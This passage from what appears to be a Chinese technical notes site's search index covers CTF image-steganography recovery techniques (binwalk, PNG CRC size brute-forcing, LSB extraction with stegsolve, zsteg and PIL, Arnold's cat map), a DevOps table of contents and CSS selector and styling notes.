<li>SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\uff0c\u4f7f\u7528 Robot36 \u7b49\u624b\u673a\u8f6f\u4ef6\u8bc6\u522b</li> </ul>"},{"location":"ctf/misc/steg/image/","title":"\u56fe\u7247\u9690\u5199","text":"<p> \u7ea6 769 \u4e2a\u5b57  69 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"ctf/misc/steg/image/#_2","title":"\u9690\u85cf\u6587\u4ef6","text":"<p>\u56fe\u7247\u4e00\u822c\u53ea\u8bfb\u53d6\u5230\u9700\u8981\u7684\u5927\u5c0f\u5c31\u505c\u6b62\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u5176\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u540e\u9762\u63d2\u5165\u5176\u4ed6\u6587\u4ef6</p> <p>\u8fd9\u65f6\u76f4\u63a5\u4f7f\u7528 binwalk foremost \u7b49\u5de5\u5177\u5c31\u53ef\u4ee5\u53d1\u73b0\u3001\u63d0\u53d6</p>"},{"location":"ctf/misc/steg/image/#png","title":"png \u6539\u53d8\u5927\u5c0f","text":"<p>png \u7684\u6587\u4ef6\u5934\u8bb0\u5f55\u4e86\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u8d85\u8fc7\u5927\u5c0f\u7684\u6570\u636e\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728\u56fe\u7247\u91cc \u5982\u679c\u662f\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u9690\u5199\u7684\u53ef\u4ee5\u76f4\u63a5\u66f4\u6539 png \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u6765\u6539\u53d8\u5927\u5c0f\u770b\u5230\u9690\u85cf\u7684\u5185\u5bb9</p>"},{"location":"ctf/misc/steg/image/#png_1","title":"png \u6587\u4ef6\u5934\u683c\u5f0f","text":"<ul> <li>\uff08 8 bytes\uff09png \u6587\u4ef6\u5934\u6807\u8bc6\uff1a<code>89 50 4E 47 0D 0A 1A 0A</code></li> <li>\uff08 4 bytes\uff09IHDR \u6570\u636e\u5757\u957f\u5ea6 13: <code>00 00 00 0D</code></li> <li>\uff08 4 bytes\uff09IHDR \u5757\u6807\u8bc6\uff1a<code>49 48 44 52</code></li> <li>\uff0813 bytes\uff09IHDR \u5757\uff1a<ul> <li>\uff084 bytes\uff09\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f</li> <li>\uff084 bytes\uff09\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f</li> <li>\uff085 bytes\uff09bit depth\u3001color type\u3001compression method\u3001filter method\u3001interlace method</li> </ul> </li> <li>\uff08 4 bytes\uff09crc \u6821\u9a8c\u7801\uff0c\u4ece IHDR \u6807\u8bc6\u5230\u5757\u7ed3\u675f\u603b\u5171 17 bytes \u7684 crc \u6821\u9a8c\u7801 </li> </ul>"},{"location":"ctf/misc/steg/image/#_3","title":"\u7206\u7834\u5927\u5c0f","text":"<pre><code>import struct\nimport binascii\n\nimg = open(\"....png\", \"rb\").read()\nheight, width = 0, 0\nfor i in range(...):\n    for j in range(...):\n        data = img[12:16] + struct.pack('&gt;i', i) + struct.pack('&gt;i', j) + img[24:29]\n        crc32 = binascii.crc32(data) &amp; 0xffffffff\n        if crc32 == 0x........:\n            height = i\n            width = j\n            print('hex:', hex(i), hex(j))\n\nnew_img = list(img)\nnew_img[16:20] = struct.pack('&gt;i', height)\nnew_img[20:24] = struct.pack('&gt;i', width)\n\nwith open('out.png','wb') as f:\n    f.write(bytes(new_img))\n</code></pre>"},{"location":"ctf/misc/steg/image/#lsb","title":"LSB \u9690\u5199","text":"<p>LSB\uff08Least Significant Bit\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\u3002\u56e0\u4e3a\u4eba\u773c\u5bf9\u989c\u8272\u7684\u5206\u8fa8\u6709\u9650\u5ea6\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539\u56fe\u7247\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u989c\u8272\u6bd4\u7279\u7684\u6700\u4f4e\u4f4d\u6765\u9690\u85cf\u4fe1\u606f\uff0c\u4f46\u4e0d\u88ab\u4eba\u773c\u5206\u8fa8\u51fa\u6765</p> <p>\u8fd9\u79cd\u9898\u76ee\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528 stegsolve \u8f6f\u4ef6\u6765\u5b8c\u6210\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u6700\u4f4e\u4f4d\u63d0\u53d6\u51fa\u6765\u4f5c\u4e3a\u7070\u5ea6\u662f\u4e00\u5f20\u56fe\u7247\uff1a\u76f4\u63a5\u5728 stegsolve \u4e2d\u6253\u5f00\u7136\u540e\u53f3\u7bad\u5934\u7ffb\u627e\u5c31\u53ef\u4ee5</li> <li>\u6700\u4f4e\u4f4d\u9690\u85cf\u4e86\u4e8c\u8fdb\u5236\u4fe1\u606f\uff1astegsolve \u6253\u5f00\uff0cAnalyze -&gt; Data Extract</li> </ul> <p>\u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 <code>PIL</code> \u5e93\u6765\u5b8c\u6210\uff1a <pre><code>from PIL import Image \n\nimg = Image.open(\"...\")\nwidth, height = img.size\nimg2 = Image.new(\"L\", img.size)\n\nfor i in range(width):\n    for j in range(height):\n                R, G, B, A = pix = img.getpixel((i, j))\n        # C, M, Y, K = pix = img.getpixel((i,j))\n        # Y, Cb, Cr = pix = img.getpixel((i, j))\n        if R &amp; 0b1 == 0:\n            img2.putpixel((i,j),0)\n        else:\n            img2.putpixel((i,j),255)    \n\nimg2.show()\n</code></pre></p> <p>\u5728 mac \u4e0a\uff0cstegsolve data extract \u4f1a\u51fa\u73b0 UI \u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 zsteg \u66ff\u4ee3\uff1a <pre><code>zsteg image.png b1,lsb -a -v    # \u663e\u793a\u6240\u6709 bgr \u987a\u5e8f\u4e0b\u7684\u6700\u4f4e\u4f4d lsb\nzsteg -E '1b,bgr,lsb' image.png # \u786e\u5b9a bgr \u987a\u5e8f\u540e\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c\n</code></pre></p>"},{"location":"ctf/misc/steg/image/#_4","title":"\u8272\u5f69\u6a21\u5f0f","text":"<p>\u4f46\u6709\u65f6\u539f\u6587\u4ef6\u7684 lsb \u770b\u4e0d\u5230\u6216\u8005\u4e0d\u6e05\u695a\uff0c\u8003\u8651\u662f\u8f6c\u6362\u4e86\u8272\u5f69\u683c\u5f0f</p> <p>\u56e0\u4e3a lsb \u7684\u539f\u7406\u662f\u63d0\u53d6\u89c6\u89c9\u5f71\u54cd\u5f31\u7684\u4f4e\u4f4d\uff0c\u6240\u4ee5\u8981\u6c42\u8f6c\u6362\u5fc5\u987b\u5b8c\u5168\u7cbe\u51c6\uff0c\u4e00\u822c\u90fd\u91c7\u7528 <code>PIL</code> \u6216\u8005 <code>cv2</code> \u5e93\u4e2d\u7684\u5185\u7f6e\u65b9\u6cd5\u8f6c\u6362\uff08\u56e0\u4e3a\u8fd0\u7b97\u65b9\u6cd5\u786e\u5b9a\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 Ps \u7b49\u8f6f\u4ef6\u6765\u8f6c\u6362\u8272\u5f69\u6a21\u5f0f\uff08\u8fc7\u4e8e\u590d\u6742\uff0c\u4e0d\u6613\u64cd\u63a7\uff0c\u4f1a\u635f\u5931\u4f4e\u4f4d\u6570\u636e\uff09</p> <p><code>PIL.Image</code> \u4e2d\u652f\u6301 11 \u79cd\u56fe\u7247\u6a21\u5f0f\uff1a1\u3001L\u3001P\u3001RGB\u3001RGBA\u3001CMYK\u3001YCbCr\u3001LAB\u3001HSV\u3001I\u3001F https://pillow.readthedocs.io/en/stable/handbook/concepts.html#concept-modes</p> <ul> <li><code>1</code> \u9ed1\u767d\u4e8c\u503c\uff08\u4f46\u662f\u662f0\u548c255\uff09</li> <li><code>L</code> \u7070\u5ea6\uff08I\u4e5f\u662f\u7070\u5ea6\uff0c\u4f46L\u662f8bit\u5b58\u50a8\uff0cI\u662f32bit\u5b58\u50a8<ul> <li><code>RGB</code>\u8f6c<code>L</code>\uff1a<code>L = R * 299/1000 + G * 587/1000+ B * 114/1000</code></li> </ul> </li> <li><code>P</code> 8bit\u8272\u503c</li> </ul> <p>RGB\u548cCMYK\u8f6c\u6362\u65f6\u6709\u8272\u5dee\uff0c\u56e0\u4e3a\u8f6c\u6362\u7684\u516c\u5f0f\u662f\uff1a <pre><code>C = 255 - R\nM = 255 - G\nY = 255 - B\nK = 0\n</code></pre> \u4e5f\u56e0\u6b64\u5728LSB\u9690\u5199\u65f6\u8fd9\u4e24\u79cd\u6a21\u5f0f\u6ca1\u6709\u5dee\u522b</p> <p>\u4f46\u662f RGB \u548c YCbCr\u3001LAB\u3001HSV \u4e4b\u95f4\u590d\u6742\u7684\u8f6c\u6362\u65f6\u5c31\u6709\u4e86\u5dee\u522b\uff0c\u4f7f\u7528\u65f6\u76f4\u63a5 <code>.convert(\"mode\")</code> \u5373\u53ef\u3002\u4e00\u4e9b PIL \u4e0d\u652f\u6301\u7684\u8f6c\u6362\u4e5f\u53ef\u4ee5\u4f7f\u7528 cv2</p>"},{"location":"ctf/misc/steg/image/#arnolds-cat-map","title":"Arnold's cat map","text":"<p>Arnold's cat map \u662f\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u6253\u4e71\u50cf\u7d20\u70b9\uff0c\u5e76\u4e14\u5728\u4e00\u5b9a\u6b21\u6570\u540e\u4f1a\u6062\u590d\u539f\u6837 https://en.wikipedia.org/wiki/Arnold%27s_cat_map <pre><code>import os\nfrom PIL.Image import open as load_pic, new as new_pic\n\ndef main(path, iterations, keep_all=False, name=\"arnold_cat-{name}-{index}.png\"):\n    title = os.path.splitext(os.path.split(path)[1])[0]\n    ppath=path\n    counter = 0\n    while counter &lt; iterations:\n        with load_pic(path) as image:\n            dim = width, height = image.size\n            with new_pic(image.mode, dim) as canvas:\n                for x in range(width):\n                    for y in range(height):\n                        nx = (2 * x + 1 * y) % width   # &lt;- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03\n                        ny = (1 * x + 1 * y) % height  # &lt;- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03\n                        canvas.putpixel((nx, height-ny-1), image.getpixel((x, height-y-1)))\n        if counter &gt; 0 and not keep_all:\n            os.remove(path)\n        counter += 1\n        print(counter, end=\"\\r\")\n        path = name.format(name=title, index=counter)\n        canvas.save(path)\n    return canvas\n\nresult = main(\"...\", ...)\nresult.show()\n</code></pre></p>"},{"location":"ctf/misc/steg/image/#_5","title":"\u9690\u5199\u5de5\u5177","text":"<p>\u6709\u4e9b\u56fe\u7247\u9690\u5199\u662f\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u6765\u9690\u85cf\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u4e00\u822c\u90fd\u9700\u8981\u5bc6\u7801\u6765\u89e3\u5bc6\uff0c\u5e38\u89c1\u7684\u6709\uff1a</p> <ul> <li>steghide\uff1ahttp://steghide.sourceforge.net/</li> <li>SilentEye\uff1ahttps://achorein.github.io/silenteye/</li> </ul>"},{"location":"devops/","title":"DevOps","text":"<p>Abstract</p> <p>\u8fd0\u7ef4\u3001\u7f51\u7edc\u7b49\u76f8\u5173\u5185\u5bb9\u5199\u5728\u8fd9\u91cc\uff01</p> <p>\u5305\u62ec\u7cfb\u7edf\u8fd0\u7ef4\u3001\u7f51\u7edc\u534f\u8bae\u3001\u524d\u7aef\u6280\u672f\u7b49\uff0c\u8fb9\u5b66\u8fb9\u52a0\u5427</p> <p>\uff08\u4e5f\u662f\u8fd8\u5728\u5b66\u4e60\uff0c\u5185\u5bb9\u5f88\u5c11\uff09</p>"},{"location":"devops/#table-of-contents","title":"Table of Contents","text":"\u7cfb\u7edf\u8fd0\u7ef4          <ul> <li> GitHub Action \u57fa\u7840\u4e0e\u8fd0\u7528  1083  252  7 mins              1755962197 </li> <li> Docker \u76f8\u5173\u914d\u7f6e\u4e0e\u6280\u672f  1616  90  7 mins              1755413598 </li> <li> KVM \u865a\u62df\u673a\u57fa\u672c\u7528\u6cd5  1070  64  4 mins              1755096921 </li> <li> NAS \u914d\u7f6e\u8bb0\u5f55  676  39  3 mins              1755096921 </li> <li> \u547d\u4ee4\u884c shell \u914d\u7f6e  339  44  2 mins              1732915806 </li> <li> Git \u76f8\u5173\u4f7f\u7528\u4e0e\u914d\u7f6e  631  35  3 mins              1732915806 </li> <li> gdb \u76f8\u5173\u4f7f\u7528\u5907\u5fd8  454  2  2 mins              1667834561 </li> </ul> \u7f51\u7edc\u8fd0\u7ef4          <ul> <li> Web \u670d\u52a1\u5668\u76f8\u5173  1075  168  6 mins              1755354247 </li> <li> \u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406  2368  265  11 mins              1754572672 </li> <li> \u57fa\u672c\u914d\u7f6e\u4e0e\u5de5\u5177  677  2 mins              1732991554 </li> <li> Clash \u4ee3\u7406\u914d\u7f6e  1595  136  7 mins              1732991554 </li> </ul> \u7f51\u7edc\u534f\u8bae          <ul> <li> VMess \u534f\u8bae  2138  49  8 mins              1671113908 </li> </ul> \u524d\u7aef\u6280\u672f          <ul> <li> CSS  1032  84  4 mins              1754572672 </li> <li> SVG  2450  224  11 mins              1754572672 </li> </ul> \u6392\u7248\u5199\u4f5c\u89c4\u8303          <ul> <li> \u4e2d\u6587\u6392\u7248\u9700\u6c42  2224  7 mins              1671206239 </li> <li> \u4e2d\u6587\u6280\u672f\u6587\u6863\u98ce\u683c\u6307\u5357  3770  13 mins              1671206239 </li> </ul>"},{"location":"devops/frontend/css/","title":"CSS","text":"<p> \u7ea6 1028 \u4e2a\u5b57  84 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>CSS \u76f8\u5173\u795e\u5947\u5999\u5999\u7528\u6cd5\u8bb0\u5f55\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>MDN CSS docs</li> </ul>"},{"location":"devops/frontend/css/#selectors","title":"Selectors","text":"<ul> <li>basic selectors<ul> <li>type: <code>div { }</code> \u9009\u62e9\u5168\u90e8 <code>&lt;div&gt;</code> \u5143\u7d20</li> <li>class: <code>.class { }</code> \u9009\u62e9\u5168\u90e8 <code>&lt;... class=\"class\"&gt;</code> \u5143\u7d20</li> <li>id: <code>#id { }</code> \u9009\u62e9\u5168\u90e8 <code>&lt;... id=\"id\"&gt;</code> \u5143\u7d20</li> <li>universal: <code>* { }</code> \u9009\u62e9\u5168\u90e8\u5143\u7d20</li> </ul> </li> <li>attribute selectors<ul> <li><code>div[title] { }</code> \u9009\u62e9\u5177\u6709 <code>title</code> \u5c5e\u6027\u7684\u5168\u90e8 <code>&lt;div&gt;</code> \u5143\u7d20</li> <li><code>div[title=\"value\"] { }</code> \u9009\u62e9\u5177\u6709 <code>title=\"value\"</code> \u5c5e\u6027\u7684\u5168\u90e8 <code>&lt;div&gt;</code> \u5143\u7d20</li> <li><code>div[title~=\"value\"] { }</code> \u9009\u62e9\u5177\u6709 <code>title</code> \u5c5e\u6027\u503c\u5305\u542b <code>value</code> \u7684\u5168\u90e8 <code>&lt;div&gt;</code> \u5143\u7d20</li> <li><code>div[lang|=\"zh\"] { }</code> \u9009\u62e9 <code>title=\"zh\"</code> \u6216 <code>title=\"zh-CN\"</code> \u7b49 <code>&lt;div&gt;</code> \u5143\u7d20</li> <li>\u6839\u636e substring \u5339\u914d\uff08\u4e0d\u6309\u7a7a\u683c\u5206\u5272\uff09<ul> <li><code>[attr^=value] { }</code> \u5f00\u5934\uff0c<code>[attr$=value] { }</code> \u7ed3\u5c3e\uff0c<code>[attr*=value] { }</code> \u4e2d\u95f4\u5305\u542b <code>value</code></li> </ul> </li> </ul> </li> <li>selector lists<ul> <li>\u9017\u53f7\u5206\u9694\uff0c\u5982 <code>div, p { }</code> \u9009\u62e9\u5168\u90e8 <code>&lt;div&gt;</code> \u548c <code>&lt;p&gt;</code> \u5143\u7d20</li> <li>\u5176\u4e2d\u6709\u4e00\u4e2a\u975e\u6cd5\u5219\u6574\u6761\u89c4\u5219\u5ffd\u7565</li> </ul> </li> <li>combinators \u7ec4\u5408\u7528\u6cd5<ul> <li>\u7a7a\u683c\u5206\u9694\uff1a<code>div p { }</code> \u9009\u62e9\u6240\u6709 <code>&lt;div&gt;</code> \u5143\u7d20\u4e0b\u7684 <code>&lt;p&gt;</code> \u5143\u7d20\uff08descendant\uff09</li> <li>&gt; \u5206\u9694\uff1a<code>div &gt; p { }</code> \u9009\u62e9\u6240\u6709 <code>&lt;div&gt;</code> \u5143\u7d20\u4e0b\u7684\u76f4\u63a5\u5b50\u5143\u7d20 <code>&lt;p&gt;</code>\uff08child\uff09</li> <li>+ \u5206\u9694\uff1a<code>div + p { }</code> \u9009\u62e9\u7d27\u63a5\u5728 <code>&lt;div&gt;</code> \u5143\u7d20\u540e\u7684 <code>&lt;p&gt;</code> \u5143\u7d20\uff08next-sibling\uff09<ul> <li>\u53cd\u8fc7\u6765\u9009\u62e9\u540e\u9762\u6709\u7d27\u63a5\u7740\u7684 <code>&lt;p&gt;</code> \u5143\u7d20\u7684 <code>&lt;div&gt;</code> \u5143\u7d20\uff1a<code>div:has(+ p) { }</code></li> </ul> </li> <li>~ \u5206\u9694\uff1a<code>div ~ p { }</code> \u9009\u62e9\u6240\u6709\u5728 <code>&lt;div&gt;</code> \u5143\u7d20\u4e4b\u540e\u7684 <code>&lt;p&gt;</code> \u5143\u7d20\uff08subsequent-sibling\uff09</li> <li>\u4e0d\u5206\u9694\uff1a\u53e0\u52a0\u9009\u62e9\u6240\u6709\u6761\u4ef6\uff0c<code>div.class#id[attr] { }</code> -&gt; <code>&lt;div class=\"class\" id=\"id\" attr=\"value\"&gt;</code></li> </ul> </li> <li>pseudo-classes \u4f2a\u7c7b<ul> <li><code>li:first-child { }</code> \u9009\u62e9\u6bcf\u4e2a\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u5b50\u5143\u7d20\u7684 <code>&lt;li&gt;</code> \u5143\u7d20<ul> <li>\u63a8\u8350\u4f7f\u7528 <code>div *:first-child { }</code> \u4ee3\u66ff <code>div :first-child { }</code> \u9632\u6b62\u6df7\u6dc6</li> </ul> </li> <li><code>:hover { }</code> \u60ac\u505c\u72b6\u6001</li> </ul> </li> <li>pseudo-elements \u4f2a\u5143\u7d20<ul> <li><code>p::first-line { }</code> \u9009\u62e9\u6bcf\u4e2a <code>&lt;p&gt;</code> \u5143\u7d20\u7684\u7b2c\u4e00\u884c</li> <li><code>p::before { content: \"Note: \"; }</code> \u5728\u6bcf\u4e2a <code>&lt;p&gt;</code> \u5143\u7d20\u524d\u63d2\u5165\u5185\u5bb9</li> <li><code>p::after { content: \" (end)\"; }</code> \u5728\u6bcf\u4e2a <code>&lt;p&gt;</code> \u5143\u7d20\u540e\u63d2\u5165\u5185\u5bb9</li> <li><code>::selection</code> \u9009\u62e9\u88ab\u7528\u6237\u9009\u4e2d\u7684\u5185\u5bb9</li> <li><code>::placeholder</code> \u9009\u62e9\u8f93\u5165\u6846\u4e2d\u7684 placeholder \u5185\u5bb9</li> <li><code>::marker</code> \u9009\u62e9\u5217\u8868\u9879\u7684\u6807\u8bb0\u7b26\u53f7</li> </ul> </li> </ul>"},{"location":"devops/frontend/css/#_1","title":"\u5d4c\u5957\u9009\u62e9\u5668","text":"<pre><code>.parent {\n    &lt;parent styles&gt;\n    .child {\n        &lt;child styles&gt;\n    }\n}\n</code></pre> <p>\u7b49\u4ef7\u4e8e</p> <pre><code>.parent {\n    &lt;parent styles&gt;\n}\n.parent .child {\n    &lt;child styles&gt;\n}\n</code></pre> <p>\u5728\u5b50\u9009\u62e9\u5668\u4e2d\u52a0\u5165 <code>&amp;</code> \u8868\u793a\u7236\u9009\u62e9\u5668\u63d2\u5165\u7684\u4f4d\u7f6e\uff1a</p> <pre><code>.parent {\n    &lt;parent styles&gt;\n    &amp;:hover {\n        &lt;parent hover styles&gt;\n    }\n    .child &amp; &amp; {\n        &lt;styles&gt;\n    }\n}\n</code></pre> <p>\u7b49\u4ef7\u4e8e</p> <pre><code>.parent {\n    &lt;parent styles&gt;\n}\n.parent:hover {\n    &lt;parent hover styles&gt;\n}\n.child .parent .parent {\n    &lt;styles&gt;\n}\n</code></pre>"},{"location":"devops/frontend/css/#_2","title":"\u5176\u4ed6\u4f2a\u7c7b","text":"<ul> <li><code>:active</code> \u6fc0\u6d3b\u72b6\u6001\uff08\u9f20\u6807\u6309\u4e0b\uff09</li> <li><code>:visited</code> \u8bbf\u95ee\u8fc7\u7684\u94fe\u63a5</li> <li><code>:first-child</code> \u7b2c\u4e00\u4e2a\u5b50\u5143\u7d20\uff0c<code>:last-child</code> \u6700\u540e\u4e00\u4e2a\u5b50\u5143\u7d20</li> <li><code>:nth-child(n)</code> \u7b2c n \u4e2a\u5b50\u5143\u7d20\uff0c<code>:nth-last-child(n)</code> \u5012\u6570\u7b2c n \u4e2a\u5b50\u5143\u7d20<ul> <li>n \u53ef\u4ee5\u662f\u6570\u5b57\u3001<code>odd</code>\uff08\u5947\u6570\uff09\u3001<code>even</code>\uff08\u5076\u6570\uff09\u3001<code>an+b</code>\uff08a \u548c b \u662f\u6574\u6570\uff0ca&gt;=0\uff09</li> <li>\u4f8b\u5982 <code>:nth-child(3n+1)</code> \u8868\u793a\u7b2c 1\u30014\u30017\u300110... \u4e2a\u5b50\u5143\u7d20</li> <li><code>:nth-last-of-type(n)</code> \u548c <code>:nth-of-type(n)</code> \u7c7b\u4f3c</li> </ul> </li> <li><code>:first-of-type</code> \u7b2c\u4e00\u4e2a\u6307\u5b9a\u7c7b\u578b\u7684\u5b50\u5143\u7d20\uff0c<code>:last-of-type</code> \u6700\u540e\u4e00\u4e2a\u6307\u5b9a\u7c7b\u578b\u7684\u5b50\u5143\u7d20</li> <li><code>:has(...)</code> \u9009\u62e9\u5305\u542b\u6307\u5b9a\u5b50\u5143\u7d20\u7684\u5143\u7d20\uff08... \u662f relative selector\uff0c\u5373 <code>+ p / &gt; p</code> \u7b49\uff09<ul> <li><code>:has(a, b)</code> \u8868\u793a or\uff0c<code>:has(a):has(b)</code> \u8868\u793a and</li> </ul> </li> <li><code>:is(a, b)</code> a \u6216 b \u4efb\u610f\u4e00\u4e2a\uff0c\u7528\u4e8e\u7b80\u5199\uff0c\u53ef\u4ee5\u751f\u6210\u4e00\u7cfb\u5217\u9009\u62e9\u5668<ul> <li><code>:is(a, b) :is(c, d)</code> \u7b49\u4ef7\u4e8e <code>a c, a d, b c, b d</code></li> </ul> </li> <li><code>:where(...)</code> \u7c7b\u4f3c <code>:is(...)</code>\uff0c\u4f46\u4e0d\u4f1a\u5f71\u54cd\u4f18\u5148\u7ea7     <pre><code>:is(section.is-style, footer.is-style) a { ... }\n:where(section.where-style, footer.where-style) a { ... }\nfooter a { ... } /* \u4f1a\u8986\u76d6 where \u7684\u89c4\u5219\uff0c\u4f46\u4e0d\u8986\u76d6 is \u7684\u89c4\u5219 */\n</code></pre></li> <li><code>:not(...)</code> \u9009\u62e9\u4e0d\u5339\u914d\u6307\u5b9a rule \u7684\u5143\u7d20</li> <li><code>:root</code> \u9009\u62e9\u6587\u6863\u7684\u6839\u5143\u7d20\uff0c\u901a\u5e38\u662f <code>&lt;html&gt;</code> \u5143\u7d20\uff0c\u5e38\u7528\u4e8e\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf     <pre><code>:root {\n    --main-color: red; /* \u5176\u4ed6\u5730\u65b9\u53ef\u4ee5\u4f7f\u7528 var(--main-color) \u6765\u5f15\u7528 */\n}\n</code></pre></li> </ul>"},{"location":"devops/frontend/css/#_3","title":"\u5176\u4ed6\u795e\u5947\u7528\u6cd5","text":""},{"location":"devops/frontend/css/#_4","title":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1","text":"<p>\u5373\u6839\u636e\u8bbe\u5907\u7684\u5c4f\u5e55\u5927\u5c0f\u6765\u8c03\u6574\u6837\u5f0f\u3002\u53ef\u4ee5\u4f7f\u7528 @media \u67e5\u8be2\u89c4\u5219\u6765\u5b9e\u73b0\uff1a</p> <pre><code>@media screen and (min-width: 960px) { /* 960px \u5bbd\u53ca\u4ee5\u4e0a\u7684\u5c4f\u5e55\u5e94\u7528\u4e0b\u9762\u7684\u6837\u5f0f */\n  html {\n    font-size: 137.5%;\n  }\n}\n@media screen and (max-width: 600px) {\n    ... /* 600px \u5bbd\u53ca\u4ee5\u4e0b\u7684\u5c4f\u5e55\u5e94\u7528\u4e0b\u9762\u7684\u6837\u5f0f */\n}\n</code></pre>"},{"location":"devops/frontend/css/#counter","title":"counter","text":"<p>\u901a\u8fc7 css \u8ba1\u6570\u5668\u53ef\u4ee5\u5b9e\u73b0\u6807\u9898\u7684\u81ea\u52a8\u7f16\u53f7\uff1a</p> <ul> <li>counter-reset\uff1a\u521b\u5efa\u5e76\u521d\u59cb\u5316\u4e00\u4e2a\u8ba1\u6570\u5668</li> <li>counter-increment\uff1a\u589e\u52a0\u8ba1\u6570\u5668\u7684\u503c</li> <li>counter()\uff1a\u83b7\u53d6\u8ba1\u6570\u5668\u7684\u5f53\u524d\u503c</li> </ul> <pre><code>h1 {\n  counter-reset: h2; /* \u9047\u5230 h1 \u65f6\u91cd\u7f6e h2 \u8ba1\u6570\u5668 */\n}\nh2 {\n  counter-reset: h3; /* \u9047\u5230 h2 \u65f6\u91cd\u7f6e h3 \u8ba1\u6570\u5668 */\n}\nh2::before {\n  counter-increment: h2; /* \u9047\u5230 h2 \u65f6\u589e\u52a0 h2 \u8ba1\u6570\u5668 */\n  content: counter(h2);  /* \u83b7\u53d6 h2 \u8ba1\u6570\u5668\u7684\u503c\u5e76\u5728\u6807\u9898\u524d\u663e\u793a */\n  margin-right: 0.8rem;\n}\nh3::before {\n  counter-increment: h3; /* \u9047\u5230 h3 \u65f6\u589e\u52a0 h3 \u8ba1\u6570\u5668 */\n  content: counter(h2) \".\" counter(h3); /* \u8fde\u63a5\u591a\u4e2a\u8ba1\u6570\u5668 */\n  margin-right: 0.8rem;\n}\n</code></pre>"},{"location":"devops/frontend/css/#important","title":"\u4f18\u5148\u7ea7\u4e0e important","text":"<pre><code>.selector.class {\n    color: red;\n}\n.selector {\n    color: blue;\n}\n</code></pre> <p>\u5373\u4f7f <code>.selector</code> \u5728\u540e\u9762\u5b9a\u4e49\uff0c<code>.selector.class</code> \u4e5f\u4f1a\u751f\u6548\uff0c\u56e0\u4e3a\u5b83\u7684\u9650\u5236\u66f4\u591a\u4f18\u5148\u7ea7\u66f4\u9ad8\u3002</p> <p>\u5728\u901a\u8fc7\u81ea\u5b9a\u4e49 css \u8986\u76d6\u539f\u6709\u6837\u5f0f\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u9700\u8981\u628a selector \u5199\u5f97\u548c\u539f\u6709\u6837\u5f0f\u4e00\u6837\u6216\u66f4\u5177\u4f53\u624d\u4f1a\u8986\u76d6\u3002\u6216\u8005\u5728\u5c5e\u6027\u540e\u9762\u52a0\u4e0a <code>!important</code> \u5f3a\u5236\u8986\u76d6\uff1a</p>"},{"location":"devops/frontend/css/#_5","title":"\u5173\u4e8e\u5b57\u4f53","text":"<p>\u4e00\u822c font-family \u5199\u6cd5\uff1a</p> <pre><code>font-family: -apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,\"Helvetica Neue\",Arial,\"Noto Sans\",\"Liberation Sans\",sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\",\"Segoe UI Symbol\",\"Noto Color Emoji\";\n</code></pre> <p>\u81ea\u5b9a\u4e49 font-family \u65f6\u6ce8\u610f fallback \u673a\u5236\uff0c\u6700\u597d\u628a\u5e38\u89c1\u7684\u5b57\u4f53\u90fd\u5217\u51fa\u6765\uff0c\u6700\u540e\u52a0\u4e0a\u901a\u7528\u5b57\u4f53\u65cf\uff08\u5982 sans-serif\u3001serif\u3001monospace \u7b49\uff09\u3002</p> <p>\u81ea\u5b9a\u4e49\u5b57\u4f53\uff1a</p> <pre><code>@font-face {\n    font-family: \"Font Name\";  /* \u540e\u7eed font-family \u4e2d\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u540d\u5b57 */\n    src: url(\"path/to/font.woff2\") format(\"woff2\"),\n         url(\"path/to/font.woff\") format(\"woff\"); /* \u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u683c\u5f0f\u4ee5\u517c\u5bb9\u4e0d\u540c\u6d4f\u89c8\u5668 */\n    font-weight: 400;    /* \u652f\u6301\u7684 weight */\n    font-style: normal;  /* \u652f\u6301\u7684 style */\n}\n</code></pre> 